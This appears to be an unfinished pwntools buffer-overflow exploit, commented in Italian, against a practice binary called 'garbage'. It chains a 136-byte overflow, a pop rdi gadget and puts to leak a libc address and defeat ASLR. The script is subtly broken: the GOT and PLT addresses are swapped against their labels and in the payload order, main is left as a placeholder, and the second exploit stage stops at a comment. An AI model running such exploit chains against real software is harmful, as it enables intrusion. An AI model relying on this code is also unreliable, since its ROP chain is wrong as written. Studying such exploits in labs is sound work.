#In questo caso ho ASRL attivo e quindi devo superarlo uso GOT PLT  (global offset table procedure linkage table)
#./garbage, vedo quanti char mi servono

from pwn import *

context(os = "Linux", arch="amd64")

#p.process("./garbage")

p = gdb.debug("./garbage", "b main")

#buffer per buffer overflow
buf = b"A"*136
#mi serve trovare l'offset got_puts e di plt_puts

# questo lo trovo con objdump -D garbage | grep  puts e prendo il primo offset puts@plt (0x401050)
got_puts = p64(0x401050)

#objdump -D garbage | grep  puts e vedo puts@GLIBC... (0x404028)
plt_puts= p64(0x404028)

#mi serve pop_rdi  perch√® devo passare a plt la got

#ropper --file garbage --search "pop rdi; ret;" (controllare poi)
pop_rdi = p64(0x40179b)


#offset del main objdump -D garbage | grep "main"
#mi serve per tornare indietro nel main e rieseguire il buffer overflow
main = p64(...)


#step 1 memory leak
payload = buf + pop_rdi + got_puts + plt_puts + main
p.sendline(payload)

p.recvuntil("access denied.\n")

#leggo fino all'ultimo carattere (con -1 tolgo il newline se no non leggo bene l'indirizzo)
#ljust lo mette nella forma 8 byte e aggiunge i null byte quando manca qualcosa
leaked_puts_address = u64(p.recvline()[:-1].ljust(8, b'\x00'))

#print in hex
print("leaked_puts_address: 0x%x " % leaked_puts_address)




#step 2 exploit

#per eseguire di nuovo il payload devo riportare il programma nel main all'inizio in modo da eseguire un nuovo payload
